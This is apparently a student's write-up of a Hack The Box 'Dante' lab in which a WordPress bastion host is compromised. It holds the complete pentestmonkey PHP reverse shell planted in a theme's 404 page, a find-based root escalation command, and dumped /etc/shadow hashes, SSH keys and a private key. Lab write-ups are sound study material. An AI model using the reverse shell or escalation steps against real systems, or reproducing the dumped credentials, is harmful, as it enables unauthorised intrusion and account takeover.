# Host 10.10.110.100 (Bastion Host)

Step #1:  Enumeration:

In beginning my enumeration of this environment, I've discovered the following ports with Nmap.:
![](./_resources/HTB_Pro_Lab_Dante.resources/image.png)
I notice there is a website titled "you can't get at me bro" and the mention of a txt file titled robots.txt. I also noticed that anonymous login is actually also allowed with FTP. There is also an open SSH port as well. Definitely running UNIX.

Step #2: FTP:

I was able to access the machine via FTP using "ftp" as the user and "password" as the password. From there, I was able to find directories that were hidden and other ones. I found the "Incoming" directory which contained the "todo.txt" file containing good information for leads on where to check or look later on.

![](./_resources/HTB_Pro_Lab_Dante.resources/image.1.png)![](./_resources/HTB_Pro_Lab_Dante.resources/image.2.png)

Step #3:  Wordpress Site:

Next, I went ahead and checked out the wordpress site that is hosted by this machine and checked for other directories with Gobuster and the common.txt wordlist.:

![](./_resources/HTB_Pro_Lab_Dante.resources/image.3.png)

![](./_resources/HTB_Pro_Lab_Dante.resources/image.4.png)

When accessing the robots.txt file in the site, I obtain the following:
![](./_resources/HTB_Pro_Lab_Dante.resources/image.5.png)
I decided to run another dictionary attack with Dirbuster this time around since I recall getting way more directories in another penetration test. As expected, the results were actually substantial this time. The file containing all of the files and directories is listed below due to the volume of information.:
![](./_resources/HTB_Pro_Lab_Dante.resources/DirBusterReport-10.csv)
The txt version is stored on the Kali Linux machine Desktop.

After going through some of the directories, I found two important pages. One is the login page which recongnizes the user "james" as a valid entry. This means I should be able to bruteforce into that account since the password is weak per the previously found "todo.txt" file.

The second page is a list of media files which I will need to inspect. This is listed below:

![](./_resources/HTB_Pro_Lab_Dante.resources/image.6.png)
The parent directories take me here:
```
http://10.10.110.100:65000/wordpress/wp-includes/js/
```
The above directory may include important user information or cookie ID's that may be associated to a particular user. Other valuable information is sure to be here somewhere so I will need to investigate carefully as this tree contains many directories and files.

After going up directories to getting to the parent ones, I was then sent to the admin and "uncategorized" welcome pages which is interesting. It seems I have just accessed the admin page from the exposed tree using the above path. The admin page is:
```
http://10.10.110.100:65000/wordpress/index.php/author/admin/
```
The uncategorized page is:
```
http://10.10.110.100:65000/wordpress/index.php/category/uncategorized/
```

I found a test cookie on both the admin page and the user.php file when viewing the storage with web dev tools.
![](./_resources/HTB_Pro_Lab_Dante.resources/image.7.png)
Value:
```
WP%20Cookie%20check
```
Name:
```
wordpress_test_cookie
```

For additional information, check the saved website for tips in Kali. So far, I've created the wordlist using ferox and cewl per the tips. The saved file is in my root directory and is called cewl.txt. Now, I need to figure out how to use Burpsuite with this agains the login page. The instructions provided don't show much of the configuration itself.

I finally found Jame's password for the wordpress site using the custom wordlist I made with cewl!:
![](./_resources/HTB_Pro_Lab_Dante.resources/image.8.png)

```
Password: Toyota
```

Here is the dashboard screen after logging in:
![](./_resources/HTB_Pro_Lab_Dante.resources/image.9.png)
I found login credentials to an email account.:
![](./_resources/HTB_Pro_Lab_Dante.resources/image.10.png)

Under the "users" section, The actual admin account has the following email linked: [a@b.com](mailto:a@b.com).

I created a new user (admin) on the site since James had the ability to do so. Not a good idea for a regular user if you ask me.:
![](./_resources/HTB_Pro_Lab_Dante.resources/image.11.png)

```
Email for the above account: test@b.com
```

In checking the comment section, I noticed the comments are numbered in the URL as an ID type of parameter. In conducting a Burpsuite scan using numbers from 1 to 65, I found the following. #16 cannot be access due to insufficient privileges apparently.
![](./_resources/HTB_Pro_Lab_Dante.resources/image.12.png)
The URL found in the response for the comment#16 may be relevant as it redirected me to the #16 comment. Perhaps I can access it indirectly from there?:

Notice: Undefined variable: daemon in /var/www/html/wordpress/wp-content/plugins/akismet/akismet.php on line 250
WARNING: Failed to daemonise. This is quite common and not fatal.
Warning: fsockopen(): unable to connect to 10.10.15.115:8899 (Connection refused) in /var/www/html/wordpress/wp-content/plugins/akismet/akismet.php on line 166

Notice: Undefined variable: daemon in /var/www/html/wordpress/wp-content/plugins/akismet/akismet.php on line 250
Connection refused (111)

After using WPScan tool (for WordPress sites, I found several paths I hadn't visited before. I also found a critical vulnerability where a vim swap file had been kept. In looking this up, these are files that get saved by VIM in the event the app closes or crashes during an edit. This file specifically stores all of the credentials for the applicable database associated with this Wordpress site which is an SQL server.
I was actually on the right track attempting to establish a reverse shell by modifying the .php file in the theme editor on the site. Using the javascript pentest monkey should actually allow me to connect to it from a netcat session after setting my Tun0 IP and the matching port after triggering the 404 error page to load. He suggested that I focus on the twenty seventeen theme and then activate it afterwards and trigger the page. Theoretically, this should allow me to establish the connection. However,  I did attempt this previously which resulted in 0 connections. I will reattempt this effort at a later time now that I know this is actually the correct way forward. I was on the right track!!..

```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.16.101';  // CHANGE THIS
$port = 9999;      // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
//
// Daemonise ourself if possible to avoid zombies later
//
// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
// Fork and have the parent process exit
$pid = pcntl_fork();
if ($pid == -1) {
printit("ERROR: Can't fork");
exit(1);
}
if ($pid) {
exit(0);  // Parent exits
}
// Make the current process a session leader
// Will only succeed if we forked
if (posix_setsid() == -1) {
printit("Error: Can't setsid()");
exit(1);
}
$daemon = 1;
} else {
printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}
// Change to a safe directory
chdir("/");
// Remove any umask we inherited
umask(0);
//
// Do the reverse shell...
//
// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
printit("$errstr ($errno)");
exit(1);
}
// Spawn shell process
$descriptorspec = array(
  0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
  1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
  2 => array("pipe", "w")  // stderr is a pipe that the child will write to
);
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {
printit("ERROR: Can't spawn shell");
exit(1);
}
// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
printit("Successfully opened reverse shell to $ip:$port");
while (1) {
// Check for end of TCP connection
if (feof($sock)) {
printit("ERROR: Shell connection terminated");
break;
}
// Check for end of STDOUT
if (feof($pipes[1])) {
printit("ERROR: Shell process terminated");
break;
}
// Wait until a command is end down $sock, or some
// command output is available on STDOUT or STDERR
$read_a = array($sock, $pipes[1], $pipes[2]);
$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
// If we can read from the TCP socket, send
// data to process's STDIN
if (in_array($sock, $read_a)) {
if ($debug) printit("SOCK READ");
$input = fread($sock, $chunk_size);
if ($debug) printit("SOCK: $input");
fwrite($pipes[0], $input);
}
// If we can read from the process's STDOUT
// send data down tcp connection
if (in_array($pipes[1], $read_a)) {
if ($debug) printit("STDOUT READ");
$input = fread($pipes[1], $chunk_size);
if ($debug) printit("STDOUT: $input");
fwrite($sock, $input);
}
// If we can read from the process's STDERR
// send data down tcp connection
if (in_array($pipes[2], $read_a)) {
if ($debug) printit("STDERR READ");
$input = fread($pipes[2], $chunk_size);
if ($debug) printit("STDERR: $input");
fwrite($sock, $input);
}
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
if (!$daemon) {
print "$string\n";
}
}
?>
```
<http://192.168.1.101/wordpress/wp-content/themes/twentyfifteen/404.php>

I finally compromised the theme and obtained the following information:
![](./_resources/HTB_Pro_Lab_Dante.resources/image.13.png)
I found the user "ironman" which had a ".sudo\_as\_admin\_successful" file which I could not open.  James is in the users listing and has the flag.txt. root is in there as well and another user called secnigma.

$ cat last-crawl.txt
1662737305$

???

The new internal subnet!:
![](./_resources/HTB_Pro_Lab_Dante.resources/image.14.png)

I found a password for Balthazar for Mysql:
![](./_resources/HTB_Pro_Lab_Dante.resources/image.15.png)

Important?:
![](./_resources/HTB_Pro_Lab_Dante.resources/image.16.png)
The Home / tmp directory shows enumeration scripts and files that mention specific priv esc vulnerabilities.

LinEnum enumeration:
![](./_resources/HTB_Pro_Lab_Dante.resources/LinEnum for Dante Prolab #1.txt)
And the second scan revealed:

![](./_resources/HTB_Pro_Lab_Dante.resources/LinEnum for Dante ProLab.txt)
Just toying around, I decided to try to su as james and using his previously found password...which WORKED!!! I was able to get the second flag!!!
![](./_resources/HTB_Pro_Lab_Dante.resources/image.17.png)
Network enumeration of internal subnet with linpeas:
![](./_resources/HTB_Pro_Lab_Dante.resources/image.18.png)
I was able to run a command using find with root privileges as shown below:
```
find test.txt -exec "/bin/bash" -p \;
whoami
root
```
"test.txt" is just a file I created that is empty. I tried setting up a reverse shell with netcat but it did not work as it sawn my IP as a directory for some reason.

Exploring etc/shadow, I was able to pull the hash of the password for the root user and the others as well:

```
root:$6$x4WJxwj1947yL6zO$As.M0EzqLeVJ6D64WhbrTJ4Ei.H72sYNnaXttuoMCzLbZpTdNs64iYpqR5Gy870jTNyOkkTqEohORLrZYF.al1:18445:0:99999:7:::
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
sys:*:18375:0:99999:7:::
sync:*:18375:0:99999:7:::
games:*:18375:0:99999:7:::
man:*:18375:0:99999:7:::
lp:*:18375:0:99999:7:::
mail:*:18375:0:99999:7:::
news:*:18375:0:99999:7:::
uucp:*:18375:0:99999:7:::
proxy:*:18375:0:99999:7:::
www-data:*:18375:0:99999:7:::
backup:*:18375:0:99999:7:::
list:*:18375:0:99999:7:::
irc:*:18375:0:99999:7:::
gnats:*:18375:0:99999:7:::
nobody:*:18375:0:99999:7:::
systemd-network:*:18375:0:99999:7:::
systemd-resolve:*:18375:0:99999:7:::
systemd-timesync:*:18375:0:99999:7:::
messagebus:*:18375:0:99999:7:::
syslog:*:18375:0:99999:7:::
_apt:*:18375:0:99999:7:::
tss:*:18375:0:99999:7:::
uuidd:*:18375:0:99999:7:::
tcpdump:*:18375:0:99999:7:::
avahi-autoipd:*:18375:0:99999:7:::
usbmux:*:18375:0:99999:7:::
rtkit:*:18375:0:99999:7:::
dnsmasq:*:18375:0:99999:7:::
cups-pk-helper:*:18375:0:99999:7:::
speech-dispatcher:!:18375:0:99999:7:::
avahi:*:18375:0:99999:7:::
kernoops:*:18375:0:99999:7:::
saned:*:18375:0:99999:7:::
nm-openvpn:*:18375:0:99999:7:::
hplip:*:18375:0:99999:7:::
whoopsie:*:18375:0:99999:7:::
colord:*:18375:0:99999:7:::
geoclue:*:18375:0:99999:7:::
pulse:*:18375:0:99999:7:::
gnome-initial-setup:*:18375:0:99999:7:::
gdm:*:18375:0:99999:7:::
systemd-coredump:!!:18391::::::
mysql:!:18391:0:99999:7:::
ftp:*:18391:0:99999:7:::
james:$6$OYTSXXkZWSSwlkBv$Gqn4PsOZ4vB7NA899oRahS7YdJlnLGK17YKcq3q4Yif.3TUxw2HTLlN3vlcapqZ2n7NcMJOcsSjcdFofK3dcu/:18391:0:99999:7:::
sshd:*:18391:0:99999:7:::
balthazar:$6$ADBqqluuRH6W2..l$WKhIu1hD1xnlq9/ZFgLvuWjH11nSGN4FgWVHBTr9e9TtDnmrnc.DuVhQqRdmv07zTYA8/4N3cigy1V9uuf7Ie0:18391:0:99999:7:::
```

I also found the last flag in the root directory:
![](./_resources/HTB_Pro_Lab_Dante.resources/image.19.png)
Authorized SSH keys found:
```
cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC5bQsTVIu/W6wqaE46s2w7MUyMcvUY7Vb3aDKZvn/rM/MceC7mHT7YymncaovXJF+GOFBofLMp0+bvIZHKndg5CFjGI5uWkxqaQszz1xyai8uDfDWl6aEKlBfOEQIX7G5k6VqUndx2N8roJfciC1eVV7qrpkNa9vi2n5yHIDPbV83u2NU3rQNY6O3NKv4xQp9gxHshowvilrV1z2/QfCOiq9HqRpVPb//F3bmrDBPC3v84k/ubjpejbv1Puf4pL9JtoEXMX8qLN1JelF4SBaomkiv1gDspRTFix1wadxFA+32JNCPVAclDBzESuUbCOPi4s2G64upB8F0brg2e9cWf6lNP/ZmW7BtdzljYbhI1wAgtDx7vOCa+dme8nbiCnDs7ZUSA4V4b734soR5BlDNy41iM9Mf74pPkFeS7o+TiG0nx9XN1IA5t2THvgqFhM5VWUCXlnDK181d3UvHc8hO2RDEjqAcVFgfByPYLtESDLUeZu6bw1xmZY5xOQi9u+Rc=
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDtfMzPg9gxfQ/FtrwrvWBygZENccGUT9k4tWKNGzTFP2IFKS0vvRhQt21QuXuc9ZfsPNVasOS//8grfSfEuYh6SPlMlNg/dxH7YMCkLpLe3qty0Igtj7G/MFa7CntYeprKSBj3J3ClEqV9wmJTVGmOft6YK+FJdxPXTiqutBZlcHTVa6a/cAweePI6g9EFpRf2fB4RHkVPc6bvPKvPrsP8sklEZ7ThpHQkyrhKpdUNBS3qCN3j6AtM7pm+RZqq0aNvtuN7rkA70W8GnMOvnRM1Z4Z9hHbzsSfzJOD4RUyk7h+ceniSWoL4Jg618aKgRGuXlBRu68RqI4EuUXWc+yz8F91Y8ZpGcWcekDyI9ygqz1Rl0MmadbYy4BMd5yRh9g4Cftek1WA63DMY5udWS9OpWpeTtThoTMQA1xhzEZQyw40KDASbiauWiQ/HEUmnRz5SFuadFUYcIwsOTHD38yasHC5nMAFPh8Qco2MBpK995HubnFSEOyOfFLNcm0Q+6W8=
```
Found rsa private key:
```
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```
Found public key:
```
cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC5bQsTVIu/W6wqaE46s2w7MUyMcvUY7Vb3aDKZvn/rM/MceC7mHT7YymncaovXJF+GOFBofLMp0+bvIZHKndg5CFjGI5uWkxqaQszz1xyai8uDfDWl6aEKlBfOEQIX7G5k6VqUndx2N8roJfciC1eVV7qrpkNa9vi2n5yHIDPbV83u2NU3rQNY6O3NKv4xQp9gxHshowvilrV1z2/QfCOiq9HqRpVPb//F3bmrDBPC3v84k/ubjpejbv1Puf4pL9JtoEXMX8qLN1JelF4SBaomkiv1gDspRTFix1wadxFA+32JNCPVAclDBzESuUbCOPi4s2G64upB8F0brg2e9cWf6lNP/ZmW7BtdzljYbhI1wAgtDx7vOCa+dme8nbiCnDs7ZUSA4V4b734soR5BlDNy41iM9Mf74pPkFeS7o+TiG0nx9XN1IA5t2THvgqFhM5VWUCXlnDK181d3UvHc8hO2RDEjqAcVFgfByPYLtESDLUeZu6bw1xmZY5xOQi9u+Rc= root@DANTE-WEB-NIX01
```
